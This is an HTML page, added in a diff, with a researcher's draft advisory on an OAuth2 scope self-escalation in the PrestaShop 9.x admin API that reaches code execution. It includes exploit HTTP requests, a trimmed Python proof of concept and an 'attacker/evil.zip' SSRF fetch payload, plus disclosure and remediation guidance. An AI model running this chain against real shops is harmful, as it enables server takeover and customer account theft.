@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>prestashop 9.x — admin api oauth2 scope self-escalation → rce · chu@antisec</title>
+    <meta name="description" content="oauth2 scope self-escalation in the prestashop 9.x admin api: a client holding only api_client_write grants itself module_write and reaches code execution as www-data. cwe-269, cvss 8.8. draft.">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Crect width='16' height='16' fill='%23080b09'/%3E%3Crect x='3' y='3' width='6' height='10' fill='%235df27f'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../styles.css">
+  </head>
+  <body>
+    <a class="skip" href="#main">skip to content</a>
+
+    <header class="chrome">
+      <div class="wrap chrome-in">
+        <a class="brand" href="../index.html">chu<span class="host">@antisec</span>:~/research$<span class="cursor" aria-hidden="true">▌</span></a>
+        <nav class="nav" aria-label="main">
+          <ul>
+            <li><a href="../index.html">home</a></li>
+            <li><a href="../research/index.html" aria-current="page">research</a></li>
+            <li><a href="../hackthebox/index.html">writeups</a></li>
+            <li><a href="../about.html">about</a></li>
+            <li><a href="https://adminions.ca/" target="_blank" rel="noopener">team</a></li>
+          </ul>
+        </nav>
+      </div>
+    </header>
+
+    <main id="main">
+      <article class="wrap hero">
+
+        <p class="crumbs"><a href="../research/index.html">← ../</a> prestashop-admin-api-scope-privesc</p>
+        <h1 class="h-prompt"><span class="ps1"><b>chu@antisec</b>:~/research$</span> cat prestashop-admin-api-scope-privesc</h1>
+        <p class="cmd">prestashop 9.x — admin api oauth2 scope self-escalation to rce</p>
+
+        <ul class="meta">
+          <li class="chip">vendor=prestashop</li>
+          <li class="chip">product=9.0.0–9.2.0</li>
+          <li class="chip chip--amber">--cvss=8.8</li>
+          <li class="chip">--cwe=269</li>
+          <li class="chip">id=reserved (cve pending)</li>
+          <li class="chip">reported=2026-06-08</li>
+          <li class="chip chip--phos">found_by=chu</li>
+          <li class="chip chip--amber">fixed_in=none released yet</li>
+          <li class="badge badge--draft">draft</li>
+        </ul>
+
+        <blockquote class="stdout stdout--tldr">
+          <p>the admin api endpoint that creates and edits api clients accepts a client-controlled
+            <code>scopes[]</code> array and <strong>never checks that the caller is entitled to the scopes it is
+              assigning</strong>. a credential holding only <code>api_client_write</code> — the scope you hand to any
+            marketplace, erp or saas integration — rewrites its own scope set to include
+            <code>module_write</code>, mints a fresh oauth token that carries it, and reaches module upload,
+            which is arbitrary php execution as <code>www-data</code>. the same escalation yields customer
+            <strong>account takeover</strong> (<code>customer_write</code>) and full <strong>ssrf</strong>
+            (<code>upload-source</code>). <strong>no admin session involved — one leaked integration
+              credential is enough.</strong></p>
+        </blockquote>
+
+        <blockquote class="stdout" lang="pt-BR">
+          <p><strong>resumo (pt-br):</strong> a admin-api (oauth2, <code>client_credentials</code>) permite que um
+            client de baixo privilégio se conceda escopos que não possui. a operação de criar/editar api clients —
+            guardada apenas pelo escopo <code>api_client_write</code> — grava no client um array
+            <code>scopes</code> totalmente controlado pelo chamador, sem verificar o que ele já detém. um token
+            que só tinha <code>api_client_write</code> cria um client com <code>module_write</code>, emite um token
+            para ele e chega a rce (instalar módulo = php rodando como <code>www-data</code>), takeover de contas
+            de clientes (<code>customer_write</code>) e ssrf full (<code>upload-source</code>). afeta
+            9.0.0–9.2.0; ≤ 8.2.x não afetadas.</p>
+        </blockquote>
+<br>
+        <div class="sec-head">
+          <span class="sec-num" aria-hidden="true">[01]</span>
+          <h2 class="sec-title">the bug</h2>
+          <span class="sec-tail">a missing delegation check</span>
+        </div>
+        <div class="prose">
+          <p>prestashop 9 ships a new <strong>admin api</strong> at <code>/admin-api</code>, built on api platform 3,
+            oauth2 (<code>client_credentials</code>) and a cqrs command layer. every operation is pinned to one or
+            more <strong>scopes</strong> named <code>{entity}_{operation}</code> — <code>product_read</code>,
+            <code>module_write</code>, and so on. on a default install of 9.1.x/9.2.x the api is active
+            out-of-the-box and enforced over https only.</p>
+          <p>by design, confinement is enforced at two points: the oauth2 server confines each token to the
+            client's own stored scope list at issuance, and a listener checks the operation's required scope on
+            every request. the mechanism is sound. the defect is that the one operation which <em>defines</em> a
+            client's scope list — <code>POST /admin-api/api-clients</code> and
+            <code>PATCH /admin-api/api-clients/{id}</code> — is gated only by
+            <code>api_client_write</code>, an ordinary assignable scope, and <strong>nobody verifies that the
+              caller holds the scopes it is writing</strong>. classic cwe-269: improper privilege management.</p>
+        </div>
+
+        <figure class="code">
+          <figcaption class="code-cap"><span class="dot">●</span> EditApiClientCommand.php <span class="cap-right">php · the only validation is is_string</span></figcaption>
+          <pre><code><span class="tk-c">// src/Core/Domain/ApiClient/Command/EditApiClientCommand.php:94</span>
+<span class="tk-k">public function</span> <span class="tk-f">setScopes</span>(?array $scopes): self
+{
+    <span class="tk-k">if</span> (<span class="tk-f">count</span>($scopes) !== <span class="tk-f">count</span>(<span class="tk-f">array_filter</span>($scopes, <span class="tk-s">'is_string'</span>))) {
+        <span class="tk-k">throw new</span> ApiClientConstraintException(<span class="tk-s">'Expected list of non empty string for scopes'</span>, ...);
+    }
+    $this-&gt;scopes = $scopes;          <span class="tk-c">// no check against the CALLER's own scopes</span>
+    <span class="tk-k">return</span> $this;
+}</code></pre>
+        </figure>
+
+        <div class="prose">
+          <p>two details make it worse instead of saving it. first, the submitted scopes <em>are</em> validated
+            downstream against the installed-scope catalogue (<code>#[InstalledApiResourceScope]</code>), so only
+            <strong>real, installed</strong> scopes can be assigned — but no layer checks whether the
+            <em>caller</em> holds them. that absent <strong>delegation</strong> check is the whole bug. second, the
+            request body is denormalized straight onto the cqrs command (an <code>ObjectNormalizer</code> without
+            <code>ALLOW_EXTRA_ATTRIBUTES =&gt; false</code>, the command itself being the input type), so the
+            <code>scopes</code> array in the json lands on <code>setScopes()</code> untouched — a textbook
+            mass-assignment sink, cwe-915.</p>
+          <p>at the next token request, <code>ScopeRepository::finalizeScopes()</code> confines the requested
+            scopes to the client's stored list — the very list the attacker just rewrote — so the escalation is
+            honored, and from then on every <code>module_write</code> check passes.</p>
+        </div>
+<br>
+        <div class="sec-head">
+          <span class="sec-num" aria-hidden="true">[02]</span>
+          <h2 class="sec-title">attack chain</h2>
+          <span class="sec-tail">api_client_write → www-data</span>
+        </div>
+        <div class="prose">
+          <p><code>module_write</code> is code execution <em>by design</em>: installing a prestashop module means
+            extracting an archive into the web-root <code>modules/</code> directory and loading its php class, and
+            php runs top-level statements and the constructor immediately. the module manager even hard-codes an
+            allowance for any api client carrying <code>module_write</code>. the chain is four requests:</p>
+        </div>
+
+        <figure class="fig">
+          <pre>  integration client                admin api                          prestashop host
+    (api_client_write)                  │                                     │
+    │                                   │                                     │
+    │ POST /admin-api/access_token      │                                     │
+    │ scope=api_client_write  ─────────►│  token T0 (low-priv)                │
+    │                                   │                                     │
+    │ POST /admin-api/api-clients       │                                     │
+    │ scopes=[<span class="hl">module_write</span>,…] ────────►│  no delegation check:               │
+    │ ◄──────── 201 {secret} ───────────│  scope list persisted as submitted  │
+    │                                   │                                     │
+    │ POST /admin-api/access_token      │                                     │
+    │ scope=module_write  ─────────────►│  token T1 — finalized against the   │
+    │                                   │  attacker-rewritten list            │
+    │ POST /admin-api/modules/          │                                     │
+    │      upload-archive  Bearer T1 ──►│── unzip into modules/ ─────────────►│
+    │                                   │   require() → php runs              │
+    │ ◄──────── uid=1000(www-data) ─────────────────── <span class="hl">code exec</span> ───────────│</pre>
+        <figcaption class="fig-cap"><b>fig 01</b> — self-escalation flow: rewrite your own scope set, mint a token, upload a module. no admin login anywhere.</figcaption>
+      </figure>
+
+      <p class="small dim">target below: a clean, default prestashop 9.2 install over real https, every request
+        through burp. starting point: a client provisioned for a low-trust integration with the single scope
+        <code>api_client_write</code>. the shop itself is untouched — the attack lives entirely in its admin api.</p>
+
+      <figure class="fig">
+        <img src="../img/prestashop/real-shop-home.png" alt="Default PrestaShop 9.2 storefront (hummingbird theme), the target shop" width="1440" height="900" loading="lazy">
+        <figcaption class="fig-cap"><b>fig 02</b> — the target: a default prestashop 9.2 storefront (hummingbird theme). its admin api is reachable over https.</figcaption>
+      </figure>
+
+      <p class="small"><b>step 1</b> — a token with the only scope we hold.</p>
+      <figure class="code">
+        <figcaption class="code-cap"><span class="dot">●</span> step1-token.http <span class="cap-right">http</span></figcaption>
+        <pre><code>POST /admin-api/access_token HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+grant_type=client_credentials&amp;client_id=lowpriv&amp;client_secret=&lt;SECRET&gt;&amp;scope=api_client_write</code></pre>
+      </figure>
+
+      <figure class="fig">
+        <img src="../img/prestashop/real-1-token.png" alt="Burp Repeater: POST /admin-api/access_token with scope=api_client_write returns HTTP 200 and a Bearer token" width="1876" height="455" loading="lazy">
+        <figcaption class="fig-cap"><b>fig 03</b> — step 1 in burp repeater: the low-priv client gets a bearer token carrying <code>api_client_write</code> only.</figcaption>
+      </figure>
+
+      <p class="small"><b>step 2</b> — the primary vulnerability: rewrite our own client's scope set. the server
+        answers <code>200</code> and echoes it back.</p>
+      <figure class="code">
+        <figcaption class="code-cap"><span class="dot">●</span> step2-escalate.http <span class="cap-right">http · no ownership check</span></figcaption>
+        <pre><code>PATCH /admin-api/api-clients/1 HTTP/1.1
+Authorization: Bearer &lt;token from step 1&gt;
+Content-Type: application/json
+
+{"scopes":["api_client_write","module_write","customer_write"]}
+
+HTTP/1.1 200 OK
+{ ... "scopes":["api_client_write","module_write","customer_write"] ... }</code></pre>
+      </figure>
+
+      <figure class="fig">
+        <img src="../img/prestashop/real-2-escalate.png" alt="Burp Repeater: PATCH /admin-api/api-clients/1 with a low-priv Bearer and body scopes [api_client_write, module_write, customer_write] returns HTTP 200 echoing the escalated scopes" width="1880" height="478" loading="lazy">
+        <figcaption class="fig-cap"><b>fig 04</b> — the escalation: a token holding only <code>api_client_write</code> rewrites its own scope set; <strong>http 200</strong> echoing <code>module_write</code> + <code>customer_write</code>.</figcaption>
+      </figure>
+
+      <p class="small"><b>step 3</b> — mint a fresh token; <code>finalizeScopes</code> now grants the self-assigned
+        scopes, and the decoded jwt proves the privilege boundary was crossed.</p>
+      <figure class="code">
+        <figcaption class="code-cap"><span class="dot">●</span> step3-token.http <span class="cap-right">http · jwt payload</span></figcaption>
+        <pre><code>POST /admin-api/access_token
+grant_type=client_credentials&amp;client_id=lowpriv&amp;client_secret=&lt;SECRET&gt;&amp;scope=module_write%20customer_write
+
+{ "aud":"lowpriv", "scopes":["is_authenticated","module_write","customer_write"] }</code></pre>
+      </figure>
+
+      <figure class="fig">
+        <img src="../img/prestashop/real-3-token.png" alt="Burp Repeater: POST /admin-api/access_token with scope=module_write customer_write returns HTTP 200 and a new Bearer token" width="1390" height="427" loading="lazy">
+        <figcaption class="fig-cap"><b>fig 05</b> — a new token is minted; the self-assigned scopes are now first-class.</figcaption>
+      </figure>
+
+      <p class="small"><b>step 4</b> — the same module upload is <strong>rejected for the low-priv token and accepted
+          for the escalated one</strong>: a clean before/after on a single endpoint. the planted module's php runs on
+        load and the command output comes back out-of-band.</p>
+      <figure class="code">
+        <figcaption class="code-cap"><span class="dot">●</span> step4-rce.http <span class="cap-right">http · module_write = code execution</span></figcaption>
+        <pre><code>POST /admin-api/modules/upload-archive   (bearer low-priv)   → <span class="tk-c">403</span> {"detail":"Invalid scope."}
+POST /admin-api/modules/upload-archive   (bearer escalated)  → <span class="tk-k">201</span> {"technicalName":"pocmod…"}
+
+<span class="tk-c"># the module's php runs on load; output captured out-of-band:</span>
+RCE @ host :: uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)</code></pre>
+      </figure>
+
+      <div class="grid grid--2">
+        <figure class="fig">
+          <img src="../img/prestashop/real-4a-upload-403.png" alt="Burp Repeater: POST /admin-api/modules/upload-archive with the low-priv Bearer returns HTTP 403 Invalid scope" width="1393" height="504" loading="lazy">
+          <figcaption class="fig-cap"><b>fig 06a</b> — before: the upload with the low-priv token → <strong>403 invalid scope</strong>.</figcaption>
+        </figure>
+        <figure class="fig">
+          <img src="../img/prestashop/real-4b-upload-201.png" alt="Burp Repeater: the identical upload with the escalated Bearer returns HTTP 201 Created and the module is installed" width="1399" height="486" loading="lazy">
+          <figcaption class="fig-cap"><b>fig 06b</b> — after: the identical upload with the escalated token → <strong>201 created</strong> = code execution.</figcaption>
+        </figure>
+      </div>
+
+      <p class="small dim">the <code>upload-source</code> variant (<code>{"source":"http://attacker/evil.zip"</code>})
+        makes the server fetch the archive itself — full ssrf reaching internal services and cloud metadata — and
+        then executes the fetched module. <code>customer_write</code> reaches
+        <code>POST /admin-api/customers</code> to create or edit any customer with an attacker-chosen password.</p>
+<br>
+      <div class="sec-head">
+        <span class="sec-num" aria-hidden="true">[03]</span>
+        <h2 class="sec-title">poc</h2>
+        <span class="sec-tail">lab only · trimmed</span>
+      </div>
+      <p class="small dim">standard library only, no dependencies; every request to the target is routed through an
+        intercepting proxy and the script refuses to run without it. trimmed to the parts that matter — the full
+        script ships with the advisory. run it only against an instance you own.</p>
+
+      <figure class="code">
+        <figcaption class="code-cap"><span class="dot">●</span> poc.py <span class="cap-right">python · trimmed · stage 1 + stage 2</span></figcaption>
+        <pre><code><span class="tk-c">#!/usr/bin/env python3</span>
+<span class="tk-c"># poc.py — prestashop admin api: oauth2 scope self-escalation → rce (>= 9.0.0)</span>
+<span class="tk-c"># stdlib only. all target traffic goes through burp (default 127.0.0.1:8080);</span>
+<span class="tk-c"># the script exits if the proxy listener is unreachable.</span>
+
+<span class="tk-k">def</span> <span class="tk-f">jwt_scopes</span>(token):
+    p = token.split(<span class="tk-s">"."</span>)[<span class="tk-n">1</span>]; p += <span class="tk-s">"="</span> * (-len(p) % <span class="tk-n">4</span>)
+    <span class="tk-k">return</span> json.loads(base64.urlsafe_b64decode(p)).get(<span class="tk-s">"scopes"</span>, [])
+
+<span class="tk-k">def</span> <span class="tk-f">get_token</span>(c, cid, secret, scope):
+    st, body = c.form(<span class="tk-s">"/admin-api/access_token"</span>, {
+        <span class="tk-s">"grant_type"</span>: <span class="tk-s">"client_credentials"</span>, <span class="tk-s">"client_id"</span>: cid,
+        <span class="tk-s">"client_secret"</span>: secret, <span class="tk-s">"scope"</span>: scope})
+    <span class="tk-k">try</span>:    <span class="tk-k">return</span> json.loads(body).get(<span class="tk-s">"access_token"</span>)
+    <span class="tk-k">except</span> Exception: <span class="tk-k">return</span> <span class="tk-n">None</span>
+
+<span class="tk-c"># stage 0 — a token with the only scope we hold</span>
+t0 = <span class="tk-f">get_token</span>(c, args.client_id, args.client_secret, <span class="tk-s">"api_client_write"</span>)
+
+<span class="tk-c"># stage 1 — PRIMARY VULN: self-grant scopes we do not hold (create-based:</span>
+<span class="tk-c"># api_client_write also reaches POST /api-clients, no numeric id needed)</span>
+esc_cid = <span class="tk-s">"escpoc_%d"</span> % int(time.time())
+st, body = c.json_req(<span class="tk-s">"POST"</span>, <span class="tk-s">"/admin-api/api-clients"</span>, {
+    <span class="tk-s">"clientId"</span>: esc_cid, <span class="tk-s">"clientName"</span>: <span class="tk-s">"escpoc"</span>, <span class="tk-s">"enabled"</span>: <span class="tk-n">True</span>,
+    <span class="tk-s">"lifetime"</span>: <span class="tk-n">3600</span>,
+    <span class="tk-s">"scopes"</span>: [<span class="tk-s">"api_client_write"</span>, <span class="tk-s">"module_write"</span>, <span class="tk-s">"customer_write"</span>]}, token=t0)
+new_secret = json.loads(body).get(<span class="tk-s">"secret"</span>)   <span class="tk-c"># 201 — nobody checked caller authority</span>
+t1 = <span class="tk-f">get_token</span>(c, esc_cid, new_secret, <span class="tk-s">"module_write customer_write"</span>)
+
+<span class="tk-k">if</span> <span class="tk-s">"module_write"</span> <span class="tk-k">in</span> <span class="tk-f">jwt_scopes</span>(t1):
+    <span class="tk-f">print</span>(<span class="tk-s">"&gt;&gt;&gt; PRIVILEGE ESCALATION CONFIRMED: api_client_write -&gt; module_write"</span>)
+
+<span class="tk-c"># stage 2 — module_write = code execution: before/after on one endpoint.</span>
+<span class="tk-c"># the planted module writes its command output out-of-band on load.</span>
+zipb = <span class="tk-f">build_module_zip</span>(<span class="tk-s">"pocmod"</span>, proof, args.cmd, args.callback)
+st, body = c.multipart(<span class="tk-s">"/admin-api/modules/upload-archive"</span>, t0, <span class="tk-s">"archive"</span>, <span class="tk-s">"poc.zip"</span>, zipb)
+<span class="tk-f">print</span>(<span class="tk-s">"  low-priv upload  -&gt; HTTP"</span>, st)       <span class="tk-c"># 403 Invalid scope.</span>
+st, body = c.multipart(<span class="tk-s">"/admin-api/modules/upload-archive"</span>, t1, <span class="tk-s">"archive"</span>, <span class="tk-s">"poc.zip"</span>, zipb)
+<span class="tk-f">print</span>(<span class="tk-s">"  escalated upload -&gt; HTTP"</span>, st)       <span class="tk-c"># 201 = the module's php ran</span>
+<span class="tk-c"># --callback serves a built-in listener: "&gt;&gt;&gt; RCE CONFIRMED" as the web user</span></code></pre>
+      </figure>
+
+      <figure class="fig">
+        <img src="../img/prestashop/real-poc-run.png" alt="PoC console running end-to-end: token with api_client_write, self-escalation to module_write+customer_write (PRIVILEGE ESCALATION CONFIRMED), upload 403 then 201, and out-of-band RCE proof uid=1000(www-data) (RCE CONFIRMED)" width="1477" height="426" loading="lazy">
+        <figcaption class="fig-cap"><b>fig 07</b> — the automated poc running the full chain end-to-end: escalation confirmed in the jwt, upload 403 → 201, rce proven out-of-band as <code>uid=1000(www-data)</code>.</figcaption>
+      </figure>
+<br>
+      <div class="sec-head">
+        <span class="sec-num" aria-hidden="true">[04]</span>
+        <h2 class="sec-title">impact</h2>
+        <span class="sec-tail">what an attacker gets</span>
+      </div>
+      <ul class="ls">
+        <li><span class="ls-mode" aria-hidden="true">$</span><span class="ls-name">remote code execution as the php user</span><span class="ls-extra">→ www-data, via module_write</span></li>
+        <li><span class="ls-mode" aria-hidden="true">$</span><span class="ls-name">customer account takeover</span><span class="ls-extra">→ customer_write: create/edit any customer, chosen password</span></li>
+        <li><span class="ls-mode" aria-hidden="true">$</span><span class="ls-name">full ssrf through module upload-source</span><span class="ls-extra">→ internal services, cloud metadata — then rce</span></li>
+        <li><span class="ls-mode" aria-hidden="true">$</span><span class="ls-name">durable persistence</span><span class="ls-extra">→ self-granted fully-scoped client, legacy webservice key, tokens that cannot be revoked</span></li>
+        <li><span class="ls-mode" aria-hidden="true">$</span><span class="ls-name">full store compromise</span><span class="ls-extra">→ catalogue, orders, customer pii, payment configuration</span></li>
+      </ul>
+      <p class="small dim">who is exposed: any 9.x shop where an integration, app or partner holds
+        <code>api_client_write</code> — and on 9.1.x/9.2.x the admin api is on out-of-the-box, so the only
+        prerequisite is that one credential. ≤ 8.2.x is not affected (no api-based client management). verified
+        dynamically on clean default installs of 9.1.4 (latest stable) and 9.2.0; the escalation itself also
+        proven on 9.0.0. since the api and the code it executes share the same
+        <code>www-data</code> authority, this scores <strong>cvss 3.1 8.8 high</strong>
+        (<code>AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code>) — defensible as <strong>9.9 critical</strong> with
+        <code>S:C</code> if the scope-to-os-code step is treated as a boundary crossing. a shop that grants an
+        integration the innocuous-looking <code>api_client_write</code> scope is effectively granting it code
+        execution on the host — a material gdpr/lgpd exposure.</p>
+<br>
+      <div class="sec-head">
+        <span class="sec-num" aria-hidden="true">[05]</span>
+        <h2 class="sec-title">disclosure timeline</h2>
+        <span class="sec-tail">coordinated · in progress</span>
+      </div>
+      <ul class="tl">
+        <li class="is-done"><span class="t-date">2026-06-06 → 07</span><span class="t-what">discovery + lab validation</span>
+          <span class="t-note">found on 9.2.0, version sweep across 9.0.0–9.2.0, re-validated end-to-end on a clean
+            default install over real https — all traffic through burp.</span></li>
+        <li class="is-done"><span class="t-date">2026-06-08</span><span class="t-what">reported (private)</span>
+          <span class="t-note">coordinated report to the prestashop security team
+            (<code>security-core@prestashop.com</code>) with the advisory, root-cause references and remediation
+            guidance, per the project's security policy.</span></li>
+        <li class="is-now"><span class="t-date">pending</span><span class="t-what">vendor triage</span>
+          <span class="t-note">ghsa/cve registration and confirmation — the identifier on this page stays
+            <code>reserved</code> until the vendor assigns one.</span></li>
+        <li class="is-now"><span class="t-date">pending</span><span class="t-what">fix released + cve assigned</span>
+          <span class="t-note">patched versions at time of report: none. fixes ship in the latest release only,
+            per the project's policy; no fixed release exists yet.</span></li>
+        <li class="is-now"><span class="t-date">pending</span><span class="t-what">public disclosure</span>
+          <span class="t-note">this page is complete and staged, but stays flagged <code>draft</code> until the
+            fix is public — then the full detail above goes live unredacted.</span></li>
+      </ul>
+<br>
+      <div class="sec-head">
+        <span class="sec-num" aria-hidden="true">[06]</span>
+        <h2 class="sec-title">remediation</h2>
+        <span class="sec-tail">for devs + merchants</span>
+      </div>
+      <div class="prose">
+        <h3>if you build an api that hands out capabilities</h3>
+        <ul>
+          <li>add the <strong>delegation check</strong>: when creating or editing a client, reject any requested
+            scope the authenticated caller does not itself hold or is not authorized to delegate. validating
+            against the scope catalogue alone is necessary but not sufficient.</li>
+          <li>never let a principal assign privileges it doesn't hold. consider gating client management behind a
+            dedicated administrative scope that itself cannot be self-assigned.</li>
+          <li>disable <strong>mass assignment</strong>: <code>ALLOW_EXTRA_ATTRIBUTES =&gt; false</code> and/or
+            explicit input dtos with an allow-list, instead of binding the request body straight onto a command.</li>
+          <li>make scope checks <strong>deny-by-default</strong>: an operation that declares no scopes must not be
+            reachable by any token, and a ci lint should fail any operation lacking a non-empty scope set.</li>
+          <li>enforce <code>enabled</code> when resolving clients, and implement real <strong>token
+              revocation</strong> — a disabled client must not keep minting working tokens.</li>
+          <li>treat module installation as a separate, high-trust capability: dedicated scope, unreachable by
+            self-grant, and consider module signing.</li>
+        </ul>
+        <h3>if you run a prestashop 9.x shop today</h3>
+        <ul>
+          <li>treat <code>api_client_write</code> as an administrative privilege and withhold it from third-party
+            integrations until a fixed release ships.</li>
+          <li>audit <code>ps_api_client.scopes</code> for clients whose scope set exceeds what their creator
+            intended — especially any low-trust client now holding <code>module_write</code>,
+            <code>customer_write</code> or <code>webservice_key_write</code> — and rotate anything you didn't
+            create yourself.</li>
+          <li>keep integration secrets in a secret manager, not in a spreadsheet named
+            <code>senhas-final-v3</code>. the client secret is shown once at creation and then lives in the
+            integration's config; it leaks through git, ci logs, screenshots and support tickets.</li>
+          <li>alert on <code>PATCH</code>/<code>POST</code> to <code>/api-clients</code> that changes
+            <code>scopes</code>, especially when followed by a module upload. that one log line catches this
+            class.</li>
+          <li>upgrade to the fixed release as soon as it is available, and re-audit every api client afterwards —
+            scopes self-granted before the patch do not un-grant themselves.</li>
+        </ul>
+      </div>
+
+    </article>
+  </main>
+
+  <footer class="foot">
+    <div class="wrap">
+      <div class="foot-row">
+        <p>chu@antisec — long life for the hacking and the cats!<span aria-hidden="true"></span></p>
+      </div>
+      <div class="foot-row">
+        <p>© 2026 chu · <a href="../research/index.html">← research</a> · <a href="../about.html#contact">contact</a></p>
+      </div>
+    </div>
+  </footer>
+  <script src="../zoom.js" defer></script>
+</body>
+</html>
